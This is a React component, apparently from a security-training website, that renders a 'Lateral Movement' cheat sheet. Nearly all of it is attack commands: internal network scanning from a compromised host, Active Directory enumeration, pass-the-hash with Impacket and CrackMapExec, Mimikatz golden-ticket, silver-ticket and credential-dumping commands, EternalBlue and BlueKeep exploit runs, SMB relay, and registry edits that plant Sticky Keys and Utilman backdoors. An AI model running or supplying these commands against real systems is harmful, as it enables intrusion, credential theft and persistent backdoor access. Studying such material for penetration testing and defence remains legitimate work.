
import React from 'react';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Tabs, TabsList, TabsTrigger, TabsContent } from '@/components/ui/tabs';
import { Network, Server, Key, Users } from 'lucide-react';
import CodeExample from '@/components/CodeExample';

const LateralMovement: React.FC = () => {
  return (
    <Card className="bg-cybr-card border-cybr-muted">
      <CardHeader>
        <CardTitle className="text-cybr-primary flex items-center gap-2">
          <Network className="h-6 w-6" />
          Lateral Movement
        </CardTitle>
      </CardHeader>
      <CardContent className="space-y-6">
        <Tabs defaultValue="network-discovery" className="w-full">
          <TabsList className="grid grid-cols-3 w-full">
            <TabsTrigger value="network-discovery">Network Discovery</TabsTrigger>
            <TabsTrigger value="credential-reuse">Credential Reuse</TabsTrigger>
            <TabsTrigger value="service-exploitation">Service Exploitation</TabsTrigger>
          </TabsList>

          <TabsContent value="network-discovery" className="space-y-4">
            <h3 className="text-xl font-semibold text-cybr-primary">Network Discovery & Enumeration</h3>
            
            <div className="space-y-4">
              <h4 className="text-lg font-medium text-cybr-secondary">Internal Network Scanning</h4>
              <CodeExample
                language="bash"
                title="Network Reconnaissance"
                code={`# Discover internal network ranges
ip route show
cat /proc/net/route
netstat -rn

# ARP table enumeration
arp -a
cat /proc/net/arp

# Network scanning from compromised host
for i in {1..254}; do
    ping -c 1 192.168.1.$i 2>/dev/null | grep "bytes from" | cut -d' ' -f4 | cut -d':' -f1 &
done
wait

# Port scanning internal hosts
for host in $(cat live_hosts.txt); do
    for port in 22 23 80 443 3389 5985 5986; do
        timeout 1 bash -c "echo >/dev/tcp/$host/$port" 2>/dev/null && echo "$host:$port OPEN"
    done
done

# Service enumeration
nmap -sS -O -sV -p- 192.168.1.0/24 -oA internal_scan`}
              />

              <h4 className="text-lg font-medium text-cybr-secondary">Active Directory Enumeration</h4>
              <CodeExample
                language="powershell"
                title="AD Reconnaissance"
                code={`# Domain enumeration
Get-ADDomain
Get-ADForest
Get-ADTrust -Filter *

# User enumeration
Get-ADUser -Filter * -Properties * | Select Name,SamAccountName,Description,PasswordLastSet,LastLogonDate
Get-ADUser -Filter {AdminCount -eq 1} -Properties AdminCount,SamAccountName

# Group enumeration
Get-ADGroup -Filter * | Select Name,Description
Get-ADGroupMember -Identity "Domain Admins"
Get-ADGroupMember -Identity "Enterprise Admins"

# Computer enumeration
Get-ADComputer -Filter * -Properties * | Select Name,OperatingSystem,PasswordLastSet,LastLogonDate

# GPO enumeration
Get-GPO -All
Get-GPOReport -All -ReportType HTML -Path "GPOReport.html"

# Kerberoasting
Get-ADUser -Filter {ServicePrincipalName -like "*"} -Properties ServicePrincipalName
Invoke-Kerberoast -OutputFormat Hashcat`}
              />
            </div>
          </TabsContent>

          <TabsContent value="credential-reuse" className="space-y-4">
            <h3 className="text-xl font-semibold text-cybr-primary">Credential Reuse & Password Attacks</h3>
            
            <div className="space-y-4">
              <h4 className="text-lg font-medium text-cybr-secondary">Pass-the-Hash Attacks</h4>
              <CodeExample
                language="bash"
                title="Pass-the-Hash with Impacket"
                code={`# Extract hashes from compromised system
secretsdump.py domain/user:password@target

# Pass-the-Hash with psexec
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 domain/user@target

# Pass-the-Hash with wmiexec
wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 domain/user@target

# Pass-the-Hash with smbexec
smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 domain/user@target

# CrackMapExec for multiple targets
crackmapexec smb 192.168.1.0/24 -u user -H 5fbc3d5fec8206a30f4b6c473d68ae76 --exec-method wmiexec -x "whoami"`}
              />

              <h4 className="text-lg font-medium text-cybr-secondary">Kerberos Attacks</h4>
              <CodeExample
                language="powershell"
                title="Kerberos Exploitation"
                code={`# Kerberoasting
Invoke-Kerberoast -OutputFormat Hashcat | fl

# ASREPRoasting (users with "Do not require Kerberos preauthentication")
Get-ASREPHash -UserName user -Domain domain.com

# Golden Ticket Attack (requires krbtgt hash)
Invoke-Mimikatz -Command '"kerberos::golden /domain:domain.com /sid:S-1-5-21-XXXXXXXXX /krbtgt:HASH_VALUE /user:admin /ticket:golden.kirbi"'

# Silver Ticket Attack
Invoke-Mimikatz -Command '"kerberos::golden /domain:domain.com /sid:S-1-5-21-XXXXXXXXX /target:server.domain.com /service:http /rc4:HASH_VALUE /user:admin /ticket:silver.kirbi"'

# Pass-the-Ticket
Invoke-Mimikatz -Command '"kerberos::ptt golden.kirbi"'

# Overpass-the-Hash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:admin /domain:domain.com /rc4:HASH_VALUE /run:cmd.exe"'`}
              />
            </div>
          </TabsContent>

          <TabsContent value="service-exploitation" className="space-y-4">
            <h3 className="text-xl font-semibold text-cybr-primary">Service & Application Exploitation</h3>
            
            <div className="space-y-4">
              <h4 className="text-lg font-medium text-cybr-secondary">SMB Exploitation</h4>
              <CodeExample
                language="bash"
                title="SMB Lateral Movement"
                code={`# SMB enumeration
smbclient -L //target -U user
enum4linux -a target
smbmap -H target -u user -p password

# SMB share access
smbclient //target/C$ -U user
smbclient //target/ADMIN$ -U user

# EternalBlue exploitation (MS17-010)
python zzz_exploit.py target

# SMB relay attack
responder -I eth0 -rv
ntlmrelayx.py -tf targets.txt -smb2support

# PsExec-style execution
psexec.py domain/user:password@target
wmiexec.py domain/user:password@target

# File upload/download
smbclient //target/C$ -U user -c "put shell.exe; get secrets.txt"`}
              />

              <h4 className="text-lg font-medium text-cybr-secondary">WinRM & PowerShell Remoting</h4>
              <CodeExample
                language="powershell"
                title="WinRM Lateral Movement"
                code={`# Enable WinRM (if not already enabled)
Enable-PSRemoting -Force

# Test WinRM connectivity
Test-WSMan -ComputerName target

# Create PowerShell session
$session = New-PSSession -ComputerName target -Credential $cred
Enter-PSSession $session

# Execute commands remotely
Invoke-Command -ComputerName target -ScriptBlock {Get-Process} -Credential $cred

# File transfer via WinRM
Copy-Item -Path "C:\\local\\file.txt" -Destination "C:\\remote\\file.txt" -ToSession $session

# PowerShell remoting with Pass-the-Hash
$password = ConvertTo-SecureString -AsPlainText -Force -String "password"
$cred = New-Object System.Management.Automation.PSCredential("domain\\user", $password)
Invoke-Command -ComputerName target -Credential $cred -ScriptBlock {whoami}

# Evil-WinRM usage
evil-winrm -i target -u user -p password
evil-winrm -i target -u user -H hash`}
              />

              <h4 className="text-lg font-medium text-cybr-secondary">RDP Exploitation</h4>
              <CodeExample
                language="bash"
                title="RDP Lateral Movement"
                code={`# RDP connectivity test
nmap -p 3389 target

# RDP connection
rdesktop target -u user -p password
xfreerdp /v:target /u:user /p:password

# RDP with Pass-the-Hash
xfreerdp /v:target /u:user /pth:hash

# BlueKeep exploitation (CVE-2019-0708)
python bluekeep_exploit.py target

# RDP credential theft
mimikatz.exe "sekurlsa::logonpasswords"

# Sticky Keys backdoor
# Replace sethc.exe with cmd.exe at login screen
REG ADD "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe" /v Debugger /t REG_SZ /d "C:\\windows\\system32\\cmd.exe"

# Utilman backdoor
REG ADD "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\utilman.exe" /v Debugger /t REG_SZ /d "C:\\windows\\system32\\cmd.exe"`}
              />
            </div>
          </TabsContent>
        </Tabs>
      </CardContent>
    </Card>
  );
};

export default LateralMovement;
